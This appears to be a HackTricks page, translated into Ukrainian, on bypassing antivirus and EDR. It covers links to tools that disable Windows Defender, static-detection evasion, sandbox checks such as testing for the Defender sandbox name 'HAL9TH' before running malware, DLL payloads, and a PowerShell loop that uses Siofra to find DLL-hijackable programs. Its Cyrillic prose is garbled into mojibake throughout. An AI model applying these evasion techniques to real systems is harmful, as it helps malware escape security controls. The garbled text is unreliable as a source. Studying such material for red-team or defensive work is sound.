# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**–¶—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –Ω–∞–ø–∏—Å–∞–≤** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Ä–æ–±–æ—Ç–∏ Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Ä–æ–±–æ—Ç–∏ Windows Defender, —è–∫–∏–π —ñ–º—ñ—Ç—É—î —ñ–Ω—à–∏–π AV.
- [–í–∏–º–∫–Ω—ñ—Ç—å Defender, —è–∫—â–æ –≤–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä](basic-powershell-for-pentesters/README.md)

## **–ú–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ AV**

–ù–∞—Ä–∞–∑—ñ AV –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —á–∏ —î —Ñ–∞–π–ª —à–∫—ñ–¥–ª–∏–≤–∏–º, —á–∏ –Ω—ñ: —Å—Ç–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è, –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑, –∞ –¥–ª—è –±—ñ–ª—å—à –ø—Ä–æ—Å—É–Ω—É—Ç–∏—Ö EDR - –ø–æ–≤–µ–¥—ñ–Ω–∫–æ–≤–∏–π –∞–Ω–∞–ª—ñ–∑.

### **–°—Ç–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è**

–°—Ç–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö —Ä—è–¥–∫—ñ–≤ –∞–±–æ –º–∞—Å–∏–≤—ñ–≤ –±–∞–π—Ç—ñ–≤ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ, –∞ —Ç–∞–∫–æ–∂ –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ —Å–∞–º–æ–≥–æ —Ñ–∞–π–ª—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–ø–∏—Å —Ñ–∞–π–ª—É, –Ω–∞–∑–≤–∞ –∫–æ–º–ø–∞–Ω—ñ—ó, —Ü–∏—Ñ—Ä–æ–≤—ñ –ø—ñ–¥–ø–∏—Å–∏, –∑–Ω–∞—á–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∞ —Å—É–º–∞ —Ç–æ—â–æ). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö –ø—É–±–ª—ñ—á–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —à–≤–∏–¥—à–æ–≥–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ —ó—Ö, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∂–µ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–≤–∞–ª–∏ —Ç–∞ –ø–æ–∑–Ω–∞—á–∏–ª–∏ —è–∫ —à–∫—ñ–¥–ª–∏–≤—ñ. –Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ —Ç–∞–∫–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è:

- **–®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è**

–Ø–∫—â–æ –≤–∏ –∑–∞—à–∏—Ñ—Ä—É—î—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, AV –Ω–µ –∑–º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º—É, –∞–ª–µ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —è–∫–∏–π—Å—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏ –≤ –ø–∞–º'—è—Ç—ñ.

- **–û–±—Ñ—É—Å–∫–∞—Ü—ñ—è**

–Ü–Ω–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ä—è–¥–∫—ñ–≤ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ, —â–æ–± –æ–±—ñ–π—Ç–∏ AV, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —Ç—Ä—É–¥–æ–º—ñ—Å—Ç–∫–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏.

- **–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**

–Ø–∫—â–æ –≤–∏ —Ä–æ–∑—Ä–æ–±–∏—Ç–µ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –Ω–µ –±—É–¥–µ –≤—ñ–¥–æ–º–∏—Ö –ø–æ–≥–∞–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤, –∞–ª–µ —Ü–µ –ø–æ—Ç—Ä–µ–±—É—î –±–∞–≥–∞—Ç–æ —á–∞—Å—É —Ç–∞ –∑—É—Å–∏–ª—å.

> [!TIP]
> –•–æ—Ä–æ—à–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å—Ç–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è Windows Defender - —Ü–µ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). –í—ñ–Ω –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—è—î —Ñ–∞–π–ª –Ω–∞ –∫—ñ–ª—å–∫–∞ —Å–µ–≥–º–µ–Ω—Ç—ñ–≤, –∞ –ø–æ—Ç—ñ–º –ø—Ä–æ—Å–∏—Ç—å Defender –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω –∑ –Ω–∏—Ö –æ–∫—Ä–µ–º–æ, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–Ω –º–æ–∂–µ —Ç–æ—á–Ω–æ —Å–∫–∞–∑–∞—Ç–∏ –≤–∞–º, —è–∫—ñ —Ä—è–¥–∫–∏ –∞–±–æ –±–∞–π—Ç–∏ –±—É–ª–∏ –ø–æ–∑–Ω–∞—á–µ–Ω—ñ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ.

–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º –æ–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—è –∑ —Ü–∏–º [YouTube –ø–ª–µ–π–ª–∏—Å—Ç–æ–º](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) –ø—Ä–æ –ø—Ä–∞–∫—Ç–∏—á–Ω–µ —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ AV.

### **–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑**

–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ - —Ü–µ –∫–æ–ª–∏ AV –∑–∞–ø—É—Å–∫–∞—î –≤–∞—à –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —É –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ —à–∫—ñ–¥–ª–∏–≤–æ—é –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞–º–∞–≥–∞—é—á–∏—Å—å —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –≤–∞—à–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞, –≤–∏–∫–æ–Ω—É—é—á–∏ –º—ñ–Ω—ñ–¥–∞–º–ø –Ω–∞ LSASS —Ç–æ—â–æ). –¶—è —á–∞—Å—Ç–∏–Ω–∞ –º–æ–∂–µ –±—É—Ç–∏ —Ç—Ä–æ—Ö–∏ —Å–∫–ª–∞–¥–Ω—ñ—à–æ—é –¥–ª—è —Ä–æ–±–æ—Ç–∏, –∞–ª–µ –æ—Å—å –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø—ñ—Å–æ—á–Ω–∏—Ü—å.

- **–°–æ–Ω –ø–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º** –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Ü–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —á—É–¥–æ–≤–∏–º —Å–ø–æ—Å–æ–±–æ–º –æ–±—ñ–π—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ AV. AV –º–∞—î –¥—É–∂–µ –∫–æ—Ä–æ—Ç–∫–∏–π —á–∞—Å –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —â–æ–± –Ω–µ –ø–µ—Ä–µ—Ä–∏–≤–∞—Ç–∏ —Ä–æ–±–æ—á–∏–π –ø—Ä–æ—Ü–µ—Å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç—Ä–∏–≤–∞–ª–∏—Ö —Å–Ω—ñ–≤ –º–æ–∂–µ –ø–æ—Ä—É—à–∏—Ç–∏ –∞–Ω–∞–ª—ñ–∑ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤. –ü—Ä–æ–±–ª–µ–º–∞ –≤ —Ç–æ–º—É, —â–æ –±–∞–≥–∞—Ç–æ –ø—ñ—Å–æ—á–Ω–∏—Ü—å AV –º–æ–∂—É—Ç—å –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–∏ —Å–æ–Ω, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Ü–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ.
- **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤ –º–∞—à–∏–Ω–∏** –ó–∞–∑–≤–∏—á–∞–π –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ –º–∞—é—Ç—å –¥—É–∂–µ –º–∞–ª–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –¥–ª—è —Ä–æ–±–æ—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, < 2 –ì–ë –û–ü), —ñ–Ω–∞–∫—à–µ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å —Å–ø–æ–≤—ñ–ª—å–Ω–∏—Ç–∏ –º–∞—à–∏–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –±—É—Ç–∏ –¥—É–∂–µ –∫—Ä–µ–∞—Ç–∏–≤–Ω–∏–º–∏ —Ç—É—Ç, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—É –¶–ü –∞–±–æ –Ω–∞–≤—ñ—Ç—å —à–≤–∏–¥–∫—ñ—Å—Ç—å –≤–µ–Ω—Ç–∏–ª—è—Ç–æ—Ä—ñ–≤, –Ω–µ –≤—Å–µ –±—É–¥–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ.
- **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∏, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –º–∞—à–∏–Ω–∏** –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —á–∏—è —Ä–æ–±–æ—á–∞ —Å—Ç–∞–Ω—Ü—ñ—è –ø—Ä–∏—î–¥–Ω–∞–Ω–∞ –¥–æ –¥–æ–º–µ–Ω—É "contoso.local", –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ–º–µ–Ω –∫–æ–º–ø'—é—Ç–µ—Ä–∞, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –≤—ñ–Ω –≤–∫–∞–∑–∞–Ω–æ–º—É –≤–∞–º–∏, —è–∫—â–æ –Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º—É –≤–∏–π—Ç–∏.

–í–∏—è–≤–ª—è—î—Ç—å—Å—è, —â–æ —ñ–º'—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ Microsoft Defender - HAL9TH, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ñ–º'—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —É –≤–∞—à–æ–º—É —à–∫—ñ–¥–ª–∏–≤–æ–º—É –ü–ó –ø–µ—Ä–µ–¥ –¥–µ—Ç–æ–Ω–∞—Ü—ñ—î—é, —è–∫—â–æ —ñ–º'—è –∑–±—ñ–≥–∞—î—Ç—å—Å—è –∑ HAL9TH, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ Defender, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º—É –≤–∏–π—Ç–∏.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>–¥–∂–µ—Ä–µ–ª–æ: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

–î–µ–∫—ñ–ª—å–∫–∞ —ñ–Ω—à–∏—Ö –¥—ñ–π—Å–Ω–æ —Ö–æ—Ä–æ—à–∏—Ö –ø–æ—Ä–∞–¥ –≤—ñ–¥ [@mgeeky](https://twitter.com/mariuszbit) –¥–ª—è –±–æ—Ä–æ—Ç—å–±–∏ –∑ –ø—ñ—Å–æ—á–Ω–∏—Ü—è–º–∏

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev –∫–∞–Ω–∞–ª</p></figcaption></figure>

–Ø–∫ –º–∏ –≤–∂–µ –≥–æ–≤–æ—Ä–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ, **–ø—É–±–ª—ñ—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏** –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç **–±—É–¥—É—Ç—å –≤–∏—è–≤–ª–µ–Ω—ñ**, —Ç–æ–º—É –≤–∞–º —Å–ª—ñ–¥ –∑–∞–ø–∏—Ç–∞—Ç–∏ —Å–µ–±–µ —â–æ—Å—å:

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —Å–∫–∏–Ω—É—Ç–∏ LSASS, **—á–∏ –¥—ñ–π—Å–Ω–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ mimikatz**? –ß–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π –ø—Ä–æ–µ–∫—Ç, —è–∫–∏–π –º–µ–Ω—à –≤—ñ–¥–æ–º–∏–π —ñ —Ç–∞–∫–æ–∂ —Å–∫–∏–¥–∞—î LSASS.

–ü—Ä–∞–≤–∏–ª—å–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –π–º–æ–≤—ñ—Ä–Ω–æ, –æ—Å—Ç–∞–Ω–Ω—è. –í–∑—è—Ç–∏ mimikatz —è–∫ –ø—Ä–∏–∫–ª–∞–¥, —Ü–µ, –Ω–∞–ø–µ–≤–Ω–æ, –æ–¥–∏–Ω –∑, —è–∫—â–æ –Ω–µ –Ω–∞–π–±—ñ–ª—å—à –ø–æ–∑–Ω–∞—á–µ–Ω–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º AV —Ç–∞ EDR, —Ö–æ—á–∞ —Å–∞–º –ø—Ä–æ–µ–∫—Ç —Å—É–ø–µ—Ä –∫–ª–∞—Å–Ω–∏–π, –∑ –Ω–∏–º —Ç–∞–∫–æ–∂ –≤–∞–∂–∫–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, —â–æ–± –æ–±—ñ–π—Ç–∏ AV, —Ç–æ–º—É –ø—Ä–æ—Å—Ç–æ —à—É–∫–∞–π—Ç–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏ –¥–ª—è —Ç–æ–≥–æ, —â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –¥–æ—Å—è–≥—Ç–∏.

> [!TIP]
> –ö–æ–ª–∏ –≤–∏ –º–æ–¥–∏—Ñ—ñ–∫—É—î—Ç–µ —Å–≤–æ—ó –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è, –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏ **–≤–∏–º–∫–Ω—É–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω—É –ø–æ–¥–∞—á—É –∑—Ä–∞–∑–∫—ñ–≤** —É Defender, —ñ, –±—É–¥—å –ª–∞—Å–∫–∞, —Å–µ—Ä–π–æ–∑–Ω–æ, **–ù–ï –ó–ê–í–ê–ù–¢–ê–ñ–£–ô–¢–ï –ù–ê VIRUSTOTAL**, —è–∫—â–æ –≤–∞—à–∞ –º–µ—Ç–∞ - –¥–æ—Å—è–≥—Ç–∏ —É—Ö–∏–ª–µ–Ω–Ω—è –≤ –¥–æ–≤–≥–æ—Å—Ç—Ä–æ–∫–æ–≤—ñ–π –ø–µ—Ä—Å–ø–µ–∫—Ç–∏–≤—ñ. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–∏—è–≤–ª—è—î—Ç—å—Å—è –ø–µ–≤–Ω–∏–º AV, –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ –Ω–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—É –º–∞—à–∏–Ω—É, —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–º–∫–Ω—É—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω—É –ø–æ–¥–∞—á—É –∑—Ä–∞–∑–∫—ñ–≤ —ñ –ø—Ä–æ—Ç–µ—Å—Ç—É–π—Ç–µ –π–æ–≥–æ —Ç–∞–º, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ—Ç–µ –∑–∞–¥–æ–≤–æ–ª–µ–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º.

## EXEs –ø—Ä–æ—Ç–∏ DLLs

–ö–æ–ª–∏ —Ü–µ –º–æ–∂–ª–∏–≤–æ, –∑–∞–≤–∂–¥–∏ **–Ω–∞–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é DLL –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è**, –Ω–∞ –º—ñ–π –ø–æ–≥–ª—è–¥, —Ñ–∞–π–ª–∏ DLL –∑–∞–∑–≤–∏—á–∞–π **–∑–Ω–∞—á–Ω–æ –º–µ–Ω—à–µ –≤–∏—è–≤–ª—è—é—Ç—å—Å—è** —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É—é—Ç—å—Å—è, —Ç–æ–º—É —Ü–µ –¥—É–∂–µ –ø—Ä–æ—Å—Ç–∏–π —Ç—Ä—é–∫, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö (—è–∫—â–æ –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–∞—î —è–∫–∏–π—Å—å —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —è–∫ DLL, –∑–≤–∏—á–∞–π–Ω–æ).

–Ø–∫ –º–∏ –º–æ–∂–µ–º–æ –±–∞—á–∏—Ç–∏ –Ω–∞ —Ü—å–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ, –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL –∑ Havoc –º–∞—î —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è 4/26 –Ω–∞ antiscan.me, —Ç–æ–¥—ñ —è–∫ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è EXE –º–∞—î —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>–ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è antiscan.me –∑–≤–∏—á–∞–π–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è Havoc EXE –ø—Ä–æ—Ç–∏ –∑–≤–∏—á–∞–π–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è Havoc DLL</p></figcaption></figure>

–¢–µ–ø–µ—Ä –º–∏ –ø–æ–∫–∞–∂–µ–º–æ –∫—ñ–ª—å–∫–∞ —Ç—Ä—é–∫—ñ–≤, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ —Ñ–∞–π–ª–∞–º–∏ DLL, —â–æ–± –±—É—Ç–∏ –Ω–∞–±–∞–≥–∞—Ç–æ –Ω–µ–ø–æ–º—ñ—Ç–Ω—ñ—à–∏–º–∏.

## –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL —Ç–∞ –ø—Ä–æ–∫—Å—É–≤–∞–Ω–Ω—è

**–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á–µ–º, —Ä–æ–∑–º—ñ—â—É—é—á–∏ —è–∫ –∂–µ—Ä—Ç–≤—É, —Ç–∞–∫ —ñ —à–∫—ñ–¥–ª–∏–≤—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–æ—Ä—É—á –æ–¥–∏–Ω –∑ –æ–¥–Ω–∏–º.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –ø—ñ–¥–ª—è–≥–∞—é—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—é DLL, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [Siofra](https://github.com/Cybereason/siofra) —Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
–¶—è –∫–æ–º–∞–Ω–¥–∞ –≤–∏–≤–µ–¥–µ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º, —è–∫—ñ –ø—ñ–¥–ª—è–≥–∞—é—Ç—å –∞—Ç–∞—Ü—ñ —á–µ—Ä–µ–∑ –ø—ñ–¥–º—ñ–Ω–∏ DLL —É "C:\Program Files\\" —Ç–∞ DLL —Ñ–∞–π–ª–∏, —è–∫—ñ –≤–æ–Ω–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏.

